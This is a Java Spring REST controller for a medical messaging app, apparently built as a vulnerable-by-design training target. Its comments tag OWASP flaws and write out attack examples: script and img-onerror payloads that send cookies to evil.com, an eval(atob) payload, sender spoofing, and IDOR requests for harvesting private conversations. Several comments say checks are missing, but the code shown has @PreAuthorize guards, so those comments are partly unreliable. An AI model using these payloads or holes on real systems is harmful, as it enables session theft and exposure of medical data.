package com.mediconnect.controller;

import com.mediconnect.dto.ConversationDto;
import com.mediconnect.dto.MessageDto;
import com.mediconnect.service.MessageService;
import lombok.RequiredArgsConstructor;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.*;

import java.util.List;

// [A05] POST / stores content without any sanitization — Stored XSS.
// [A01] GET /conversation/{userId} does not verify the caller is a participant.
// [A01] DELETE /{id} does not verify the caller owns the message.
@RestController
@RequestMapping("/api/messages")
@RequiredArgsConstructor
public class MessageController {

    private final MessageService messageService;

    // [A01] userId query param not verified against JWT — any user can fetch any other user's conversations
    @GetMapping("/conversations")
    @PreAuthorize("@authz.isSelf(authentication,#userId) or @authz.isAdmin(authentication)")
    public ResponseEntity<List<ConversationDto>> getConversations(@RequestParam Long userId) {
        return ResponseEntity.ok(messageService.getConversations(userId));
    }

    // [A05] Stored XSS — content field written to the database verbatim.
    //        Any HTML or JavaScript in the payload is stored and returned to
    //        every recipient who fetches the conversation.
    //
    //        Attack payloads:
    //          {"content": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}
    //          {"content": "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>"}
    //          {"content": "<svg onload=eval(atob('base64payload'))>"}
    //
    // [A07] senderId taken from request body — sender spoofing:
    //        {"senderId": 5, "receiverId": 2, ...} sends as user 5 without authentication.
    @PostMapping
    public ResponseEntity<MessageDto> send(@RequestBody MessageDto dto) {
        return ResponseEntity.status(201).body(messageService.send(dto));
    }

    // [A01] IDOR — viewerId is supplied as a query parameter and is never compared
    //        to the authenticated principal from the JWT.
    //        Any caller can read the private conversation between any two users
    //        by supplying arbitrary viewerId and userId values.
    //
    //        Attack:
    //          GET /api/messages/conversation/2?viewerId=1  → reads user 1 ↔ user 2 conversation
    //          GET /api/messages/conversation/3?viewerId=1  → reads user 1 ↔ user 3 conversation
    //          (iterate userId to harvest all private medical conversations)
    @GetMapping("/conversation/{userId}")
    @PreAuthorize("@authz.isSelf(authentication,#viewerId) or @authz.isAdmin(authentication)")
    public ResponseEntity<List<MessageDto>> getConversation(
            @PathVariable Long userId,
            @RequestParam Long viewerId) {
        return ResponseEntity.ok(messageService.getConversation(viewerId, userId));
    }

    // [A01] Broken Access Control — no ownership check before deletion.
    //        Any user (or unauthenticated caller, given SecurityConfig.permitAll)
    //        can delete any message by its id.
    //
    //        Attack: DELETE /api/messages/42  → deletes message 42 regardless of sender.
    @DeleteMapping("/{id}")
    @PreAuthorize("@authz.canViewMessage(authentication,#id)")
    public ResponseEntity<Void> deleteMessage(@PathVariable Long id) {
        messageService.deleteById(id);
        return ResponseEntity.noContent().build();
    }

    @GetMapping("/inbox/{userId}")
    @PreAuthorize("@authz.isSelf(authentication,#userId) or @authz.isAdmin(authentication)")
    public ResponseEntity<List<MessageDto>> getInbox(@PathVariable Long userId) {
        return ResponseEntity.ok(messageService.getInbox(userId));
    }

    @PatchMapping("/{id}/read")
    @PreAuthorize("@authz.canViewMessage(authentication,#id)")
    public ResponseEntity<MessageDto> markAsRead(@PathVariable Long id) {
        return ResponseEntity.ok(messageService.markAsRead(id));
    }
}
